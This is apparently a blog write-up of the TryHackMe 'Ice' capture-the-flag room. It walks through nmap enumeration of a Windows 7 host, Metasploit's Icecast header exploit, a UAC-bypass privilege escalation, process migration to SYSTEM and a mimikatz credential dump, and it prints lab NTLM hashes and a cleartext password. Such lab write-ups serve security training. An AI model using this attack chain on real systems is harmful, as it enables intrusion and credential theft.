---
title: "Ice"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

{{< post-img src="ice.png" alt="ice" style="width: 200px;" >}}

## Enumeration

```bash
PORT      STATE SERVICE            REASON  VERSION
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack
| ssl-cert: Subject: commonName=Dark-PC
| Issuer: commonName=Dark-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-11-09T01:04:38
| Not valid after:  2022-05-11T01:04:38
| MD5:   c2cb 143b f9c6 ac54 b425 0a60 8906 c4dc
| SHA-1: 5009 f1e1 6c50 e160 5b08 ec91 138f 3001 e1ab ebd4
| -----BEGIN CERTIFICATE-----
| MIIC0jCCAbqgAwIBAgIQWdotJunPLqZKUeGBMEa/cTANBgkqhkiG9w0BAQUFADAS
| MRAwDgYDVQQDEwdEYXJrLVBDMB4XDTIxMTEwOTAxMDQzOFoXDTIyMDUxMTAxMDQz
| OFowEjEQMA4GA1UEAxMHRGFyay1QQzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
| AQoCggEBAK3iiROzM2/JhP5ZlTbpLF4bDHwtqGtikJZQiYl9YlQyunXYd7g9wuyr
| q40+LqPhGhL/9AYoICA3bioFTMG+qtwUFcxHD9iiQf/O6esz8oOeP1RJkD0CzD5u
| kZtt6ZUzFDvYViMreE+xjKl1R3NN4paZX8ItkjSPRuFMbWKEcmTK5ueAS0ydRl5k
| Xt43+NN/mxk7hkzif41nS/a6kdiSK2dAf/aeUUccbNMx9ln5neZvjX1aiUBZR9FG
| x7KrnpwllTF33F7LLxbmuZAmQO30IletT2Y5cJ7up3Kikmb+ZOpa+ulhovayZI+E
| R+jKTWn/eCrZ1ayuLaGjxDIag4LOp40CAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYB
| BQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IBAQAGkB+WbnS3JDae
| w8aoKztZjvhN9vEvcqS/8ovSZfTiO9NvhoKs2cM2UqYoWfH/TU+vrH3tuE524S3+
| gVwpTHKNzoo1N/WUC8TMsZvvYX2VoJdZTfMLSR7j0PLjAqD7RjQhWjFTPPYmy1hz
| NaON+TdKHxxyl79STd+WV8V42OzKwPkk1seHzTwu4s42rOrpactHH/3QGSj0UD4J
| yTZv79XFEOV9HYKkaBNvOMLgd1tJ8ajQQ8cwq5F1+qpQ6iyozowb/uF/TX2YLE+7
| fXmhE1d51W8iByjscywdbzxWZEqb2SFCXVdNTRXWQkM3I5YxT3Eg9ti43c75iDaH
| RvDzv+fG
|_-----END CERTIFICATE-----
|_ssl-date: 2021-11-10T01:14:13+00:00; +2m30s from scanner time.
5357/tcp  open  http               syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http               syn-ack Icecast streaming media server
| http-methods:
|_  Supported Methods: GET
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack Microsoft Windows RPC
49159/tcp open  msrpc              syn-ack Microsoft Windows RPC
49160/tcp open  msrpc              syn-ack Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 26444/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 14833/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 36762/udp): CLEAN (Timeout)
|   Check 4 (port 17683/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:01:ea:57:15:c7 (unknown)
| Names:
|   DARK-PC<00>          Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   DARK-PC<20>          Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   02 01 ea 57 15 c7 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-11-10T01:14:00
|_  start_date: 2021-11-10T01:04:22
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-11-09T19:14:00-06:00
|_clock-skew: mean: 1h32m29s, deviation: 3h00m00s, median: 2m29s
```

windows machines are less frequent thus my favorites
Icecast running on port 8000
The room is called ice don't even look further

we use metasploit `exploit(windows/http/icecast_header)`

```bash
meterpreter > getuid
Server username: Dark-PC\Dark
meterpreter > sysinfo
Computer : DARK-PC
OS : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture : x64
System Language : en_US
Domain : WORKGROUP
Logged On Users : 2
Meterpreter : x86/windows
```

That was quick access

## Privilege Escalation

run `post/multi/recon/local_exploit_suggester`

I had issues here...the module was suggesting a wrong exploit

> While this doesn't work the best on x64 machines

the room even foretold it

```bash
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.166.226 - Collecting local exploits for x86/windows...
[*] 10.10.166.226 - 4 exploit checks are being tried...
[+] 10.10.166.226 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
```

only 4 checks are being tried

The right expploit to use is

`exploit(windows/local/bypassuac_eventvwr)`

```bash
meterpreter > getprivs

# Enabled Process Privileges

## Name

SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

SeTakeOwnershipPrivilege is what allows us to get files

we migrate to spoolsv.exe (best service for privesc)

```bash
meterpreter > migrate 1260
[*] Migrating from 1848 to 1260...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Ah good ol' mimikatz

```bash
meterpreter > load kiwi
Loading extension kiwi...
.#####. mimikatz 2.2.0 20191125 (x64/windows)
.## ^ ##. "A La Vie, A L'Amour" - (oe.eo)

## / \ ## /\*\*\* Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )

## \ / ## > http://blog.gentilkiwi.com/mimikatz

'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )
'#####' > http://pingcastle.com / http://mysmartlogon.com \*\*\*/

Success.
```

Now those are mimikatz (kiwi) commands

```bash
meterpreter > help

# Kiwi Commands

Command Description

---

creds_all Retrieve all credentials (parsed)
creds_kerberos Retrieve Kerberos creds (parsed)
creds_livessp Retrieve Live SSP creds
creds_msv Retrieve LM/NTLM creds (parsed)
creds_ssp Retrieve SSP creds
creds_tspkg Retrieve TsPkg creds (parsed)
creds_wdigest Retrieve WDigest creds (parsed)
dcsync Retrieve user account information via DCSync (unparsed)
dcsync_ntlm Retrieve user account NTLM hash, SID and RID via DCSync
golden_ticket_create Create a golden kerberos ticket
kerberos_ticket_list List all kerberos tickets (unparsed)
kerberos_ticket_purge Purge any in-use kerberos tickets
kerberos_ticket_use Use a kerberos ticket
kiwi_cmd Execute an arbitary mimikatz command (unparsed)
lsa_dump_sam Dump LSA SAM (unparsed)
lsa_dump_secrets Dump LSA secrets (unparsed)
password_change Change the password/hash of a user
wifi_list List wifi profiles/creds for the current user
wifi_list_shared List shared wifi profiles/creds (requires SYSTEM)

# msv credentials

Username Domain LM NTLM SHA1

---

Dark Dark-PC e52cac67419a9a22ecb08369099ed302 7c4fe5eada682714a036e39378362bab 0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

# wdigest credentials

Username Domain Password

---

(null) (null) (null)
DARK-PC$ WORKGROUP (null)
Dark Dark-PC Password01!

# tspkg credentials

Username Domain Password

---

Dark Dark-PC Password01!

# kerberos credentials

Username Domain Password

---

(null) (null) (null)
Dark Dark-PC Password01!
dark-pc$ WORKGROUP (null)
```

Now we can RDP to the machine with the workstation creds:

`Dark : Password01!`

we have a new machine in our collection
